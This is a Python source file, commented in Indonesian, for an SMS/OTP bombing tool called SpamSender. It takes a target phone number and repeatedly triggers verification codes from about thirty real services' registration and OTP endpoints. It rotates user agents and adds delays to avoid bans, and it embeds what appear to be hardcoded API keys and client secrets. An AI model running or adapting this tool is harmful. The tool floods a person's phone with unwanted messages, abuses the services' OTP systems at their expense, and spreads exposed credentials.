import requests
import json
import time
import random
from datetime import datetime
import config

class SpamSender:
    def __init__(self, nomor):
        self.nomor = nomor
        self.results = []
        
        # Format nomor
        if nomor.startswith('0'):
            self.b = nomor[1:]  # Hapus 0 di depan
        elif nomor.startswith('62'):
            self.b = nomor[2:]  # Hapus 62
            self.nomor = '0' + self.b
        else:
            self.b = nomor
            self.nomor = '0' + self.b
        
        self.c = "62" + self.b
        
        print(f"{config.GREEN}[+] Target: {self.nomor} | Format: {self.c}{config.RESET}")
        
    def send_all(self):
        """Kirim ke semua layanan"""
        
        services = [
            self.send_ktbs,
            self.send_klikwa,
            self.send_payfazz,
            self.send_securedapi,
            self.send_matahari,
            self.send_battlefront,
            self.send_pinjamindo,
            self.send_jumpstart,
            self.send_asani,
            self.send_depop,
            self.send_indo_from30,
            self.send_wa2_from30,
            self.send_icq,
            self.send_cairin,
            self.send_cmsapi,
            self.send_bukuwarung,
            self.send_beryllium,
            self.send_danacita,
            self.send_kredito,
            self.send_maucash,
            self.send_gojek,
            self.send_harvestcake,
            self.send_oyo,
            self.send_foa,
            self.send_sayurbox,
            self.send_tokko,
            self.send_carsome,
            self.send_jenius,
            self.send_alodokter,
            self.send_pizzahut,
            self.send_misteraladin
        ]
        
        total = len(services)
        print(f"{config.YELLOW}[*] Memulai pengiriman ke {total} layanan...{config.RESET}")
        
        for idx, service in enumerate(services, 1):
            print(f"{config.BLUE}[{idx}/{total}] Mengirim ke {service.__name__.replace('send_', '').upper()}...{config.RESET}", end=' ')
            try:
                result = service()
                self.results.append(result)
                if result['success']:
                    print(f"{config.GREEN}✓ BERHASIL{config.RESET}")
                else:
                    print(f"{config.RED}✗ GAGAL: {result.get('message', 'Unknown')[:50]}{config.RESET}")
            except Exception as e:
                print(f"{config.RED}✗ ERROR: {str(e)[:50]}{config.RESET}")
                self.results.append({
                    'service': service.__name__.replace('send_', '').upper(),
                    'success': False,
                    'message': str(e)[:100]
                })
            
            # Delay biar gak kena ban
            if idx < total:
                time.sleep(config.DELAY_BETWEEN_REQUESTS)
        
        return self.results
    
    def _post(self, url, data=None, headers=None, json_data=None):
        """Wrapper POST request"""
        headers = headers or {}
        headers['User-Agent'] = random.choice(config.USER_AGENTS)
        headers['Accept'] = 'application/json, text/plain, */*'
        headers['Accept-Language'] = 'id-ID,id;q=0.9,en;q=0.8'
        headers['Connection'] = 'keep-alive'
        
        try:
            if json_data:
                resp = requests.post(url, json=json_data, headers=headers, timeout=config.REQUEST_TIMEOUT)
            else:
                resp = requests.post(url, data=data, headers=headers, timeout=config.REQUEST_TIMEOUT)
            return resp
        except Exception as e:
            raise e
    
    def _get(self, url, headers=None):
        """Wrapper GET request"""
        headers = headers or {}
        headers['User-Agent'] = random.choice(config.USER_AGENTS)
        
        try:
            resp = requests.get(url, headers=headers, timeout=config.REQUEST_TIMEOUT)
            return resp
        except Exception as e:
            raise e
    
    # ============ SERVICE IMPLEMENTATIONS ============
    
    def send_ktbs(self):
        try:
            url = f'https://core.ktbs.io/v2/user/registration/otp/{self.nomor}'
            resp = self._get(url)
            return {
                'service': 'KTBS.IO',
                'success': resp.status_code == 200,
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'KTBS.IO', 'success': False, 'message': str(e)}
    
    def send_klikwa(self):
        try:
            url = "https://api.klikwa.net/v1/number/sendotp"
            headers = {'Authorization': 'Basic QjMzOkZSMzM='}
            data = json.dumps({"number": self.c})
            resp = self._post(url, headers=headers, json_data={"number": self.c})
            return {
                'service': 'KLIKWA',
                'success': resp.status_code in [200, 201, 202],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'KLIKWA', 'success': False, 'message': str(e)}
    
    def send_payfazz(self):
        try:
            url = "https://api.payfazz.com/v2/phoneVerifications"
            data = {"phone": self.nomor}
            resp = self._post(url, data=data)
            return {
                'service': 'PAYFAZZ',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'PAYFAZZ', 'success': False, 'message': str(e)}
    
    def send_securedapi(self):
        try:
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={self.nomor}"
            resp = self._post(url)
            return {
                'service': 'CONFIRMTKT',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'CONFIRMTKT', 'success': False, 'message': str(e)}
    
    def send_matahari(self):
        try:
            url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
            headers = {'Content-Type': 'application/json'}
            data = {"otp_request": {"mobile_number": self.nomor, "mobile_country_code": "+62"}}
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'MATAHARI',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'MATAHARI', 'success': False, 'message': str(e)}
    
    def send_battlefront(self):
        try:
            url = "https://battlefront.danacepat.com/v1/auth/common/phone/send-code"
            data = {'mobile_no': self.b}
            resp = self._post(url, data=data)
            return {
                'service': 'BATTLEFRONT',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'BATTLEFRONT', 'success': False, 'message': str(e)}
    
    def send_pinjamindo(self):
        try:
            url = f"https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile={self.c}&af_id=1603255661130&app=pinjamindo"
            resp = self._get(url)
            return {
                'service': 'PINJAMINDO',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'PINJAMINDO', 'success': False, 'message': str(e)}
    
    def send_jumpstart(self):
        try:
            url = "https://api.jumpstart.id/graphql"
            headers = {'Content-Type': 'application/json'}
            query = {
                "operationName": "CheckPhoneNoAndGenerateOtpIfNotExist",
                "variables": {"phoneNo": self.c},
                "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"
            }
            resp = self._post(url, headers=headers, json_data=query)
            return {
                'service': 'JUMPSTART',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'JUMPSTART', 'success': False, 'message': str(e)}
    
    def send_asani(self):
        try:
            url = "https://api.asani.co.id/api/v1/send-otp"
            headers = {'Content-Type': 'application/json'}
            data = {"phone": self.c, "email": f"test{random.randint(1,9999)}@example.com"}
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'ASANI',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'ASANI', 'success': False, 'message': str(e)}
    
    def send_depop(self):
        try:
            url = "https://webapi.depop.com/api/auth/v1/verify/phone"
            headers = {'Content-Type': 'application/json'}
            data = {"phone_number": self.nomor, "country_code": "ID"}
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'DEPOP',
                'success': resp.status_code in [200, 201, 202],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'DEPOP', 'success': False, 'message': str(e)}
    
    def send_indo_from30(self):
        try:
            url = f"https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={self.nomor}"
            resp = self._get(url)
            return {
                'service': 'KLIKINDOMARET',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'KLIKINDOMARET', 'success': False, 'message': str(e)}
    
    def send_wa2_from30(self):
        try:
            url = "https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0="
            data = {
                "namaDepan": "Test" + str(random.randint(11, 999)),
                "emailNope": self.nomor,
                "password": "Test" + str(random.randint(111, 999)),
                "konfirmasiPass": "Test" + str(random.randint(111, 999))
            }
            resp = self._post(url, data=data)
            return {
                'service': 'QTVA',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'QTVA', 'success': False, 'message': str(e)}
    
    def send_icq(self):
        try:
            url = "https://u.icq.net/api/v14/rapi/auth/sendCode"
            headers = {'Content-Type': 'application/json'}
            data = {
                "reqId": f"64708-{int(time.time())}",
                "params": {"phone": self.c, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r"}
            }
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'ICQ',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'ICQ', 'success': False, 'message': str(e)}
    
    def send_cairin(self):
        try:
            url = "https://app.cairin.id/v1/app/sms/sendCaptcha"
            data = {
                "haveImageCode": "0",
                "fileName": f"test_{int(time.time())}",
                "phone": self.nomor,
                "imageCode": "",
                "userImei": "",
                "type": "registry"
            }
            resp = self._post(url, data=data)
            return {
                'service': 'CAIRIN',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'CAIRIN', 'success': False, 'message': str(e)}
    
    def send_cmsapi(self):
        try:
            url = "https://cmsapi.mapclub.com/api/signup-otp"
            data = {"phone": self.nomor}
            resp = self._post(url, data=data)
            return {
                'service': 'MAPCLUB',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'MAPCLUB', 'success': False, 'message': str(e)}
    
    def send_bukuwarung(self):
        try:
            url = "https://api-v2.bukuwarung.com/api/v2/auth/otp/send"
            headers = {'Content-Type': 'application/json'}
            data = {
                "action": "LOGIN_OTP",
                "countryCode": "+62",
                "deviceId": f"test_{int(time.time())}",
                "method": "WA",
                "phone": self.nomor,
                "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
                "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
            }
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'BUKUWARUNG',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'BUKUWARUNG', 'success': False, 'message': str(e)}
    
    def send_beryllium(self):
        try:
            url = "https://beryllium.mapclub.com/api/member/registration/sms/otp"
            headers = {'Content-Type': 'application/json'}
            data = {"account": self.nomor}
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'BERYLLIUM',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'BERYLLIUM', 'success': False, 'message': str(e)}
    
    def send_danacita(self):
        try:
            url = f"https://api.danacita.co.id/users/send_otp/?mobile_phone={self.nomor}"
            resp = self._get(url)
            return {
                'service': DANACITA,
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'DANACITA', 'success': False, 'message': str(e)}
    
    def send_kredito(self):
        try:
            url = "https://app-api.kredito.id/client/v1/common/verify-code/send"
            data = f'{{"event":"default_verification","mobilePhone":"{self.b}","sender":"jatissms"}}'
            headers = {'Content-Type': 'application/json', 'Accept-Language': 'id-ID'}
            resp = self._post(url, headers=headers, data=data)
            return {
                'service': 'KREDITO',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'KREDITO', 'success': False, 'message': str(e)}
    
    def send_maucash(self):
        try:
            url = f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={self.b}&channelType=0"
            resp = self._get(url)
            return {
                'service': 'MAUCASH',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'MAUCASH', 'success': False, 'message': str(e)}
    
    def send_gojek(self):
        try:
            url = "https://api.gojekapi.com/v5/customers"
            headers = {
                'X-Session-ID': f'test_{int(time.time())}',
                'X-Platform': 'Android',
                'X-AppVersion': '3.52.2',
                'Content-Type': 'application/json'
            }
            data = {
                "email": f"test{random.randint(1,9999)}@test.com",
                "name": "Test User",
                "phone": self.c,
                "signed_up_country": "ID"
            }
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'GOJEK',
                'success': resp.status_code in [200, 201, 202],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'GOJEK', 'success': False, 'message': str(e)}
    
    def send_harvestcake(self):
        try:
            url = "https://harvestcakes.com/register"
            data = {"phone": self.b}
            resp = self._post(url, data=data)
            return {
                'service': 'HARVESTCAKE',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'HARVESTCAKE', 'success': False, 'message': str(e)}
    
    def send_oyo(self):
        try:
            url = "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id"
            headers = {'Content-Type': 'application/json'}
            data = {
                "phone": self.b,
                "country_code": "+62",
                "country_iso_code": "ID",
                "nod": "4",
                "send_otp": "true",
                "devise_role": "Consumer_Guest"
            }
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'OYO',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'OYO', 'success': False, 'message': str(e)}
    
    def send_foa(self):
        try:
            url = "https://foreignadmits.com/api/register-otp-generate-student"
            data = {'mobile': self.c, 'countryCode': '+62'}
            resp = self._post(url, data=data)
            return {
                'service': 'FOREIGNADMITS',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'FOREIGNADMITS', 'success': False, 'message': str(e)}
    
    def send_sayurbox(self):
        try:
            url = "https://www.sayurbox.com/graphql/v1"
            headers = {'Content-Type': 'application/json'}
            query = {
                "operationName": "generateOTP",
                "variables": {"destinationType": "whatsapp", "identity": self.c},
                "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
            }
            resp = self._post(url, headers=headers, json_data=query)
            return {
                'service': 'SAYURBOX',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'SAYURBOX', 'success': False, 'message': str(e)}
    
    def send_tokko(self):
        try:
            url = "https://api.tokko.io/graphql"
            headers = {'Content-Type': 'application/json'}
            query = {
                "operationName": "generateOTP",
                "variables": {
                    "generateOtpInput": {
                        "phoneNumber": self.c,
                        "hashCode": "",
                        "channel": "WHATSAPP",
                        "userType": "MERCHANT"
                    }
                },
                "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}"
            }
            resp = self._post(url, headers=headers, json_data=query)
            return {
                'service': 'TOKKO',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'TOKKO', 'success': False, 'message': str(e)}
    
    def send_carsome(self):
        try:
            url = "https://www.carsome.id/website/login/sendSMS"
            headers = {'Content-Type': 'application/json'}
            data = {"username": self.nomor, "optType": 1}
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'CARSOME',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'CARSOME', 'success': False, 'message': str(e)}
    
    def send_jenius(self):
        try:
            url = "https://api.btpn.com/jenius"
            headers = {
                'Content-Type': 'application/json',
                'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d',
                'version': '2.36.1-7565'
            }
            query = {
                "query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n",
                "variables": {"phone": self.c, "language": "id"},
                "operationName": "registerPhone"
            }
            resp = self._post(url, headers=headers, json_data=query)
            return {
                'service': 'JENIUS',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'JENIUS', 'success': False, 'message': str(e)}
    
    def send_alodokter(self):
        try:
            url = "https://www.alodokter.com/login-with-phone-number"
            headers = {'Content-Type': 'application/json'}
            data = {"user": {"phone": self.nomor}}
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'ALODOKTER',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'ALODOKTER', 'success': False, 'message': str(e)}
    
    def send_pizzahut(self):
        try:
            url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"
            headers = {'Content-Type': 'application/json'}
            data = {
                "email": f"test{random.randint(1,9999)}@test.com",
                "first_name": "Test",
                "last_name": "User",
                "password": "Test123456",
                "phone": self.nomor,
                "birthday": "2000-01-01"
            }
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'PIZZAHUT',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'PIZZAHUT', 'success': False, 'message': str(e)}
    
    def send_misteraladin(self):
        try:
            url = "https://m.misteraladin.com/api/members/v2/otp/request"
            headers = {'Content-Type': 'application/json'}
            data = {
                "phone_number_country_code": "62",
                "phone_number": self.b,
                "type": "register"
            }
            resp = self._post(url, headers=headers, json_data=data)
            return {
                'service': 'MISTERALADIN',
                'success': resp.status_code in [200, 201],
                'status_code': resp.status_code
            }
        except Exception as e:
            return {'service': 'MISTERALADIN', 'success': False, 'message': str(e)}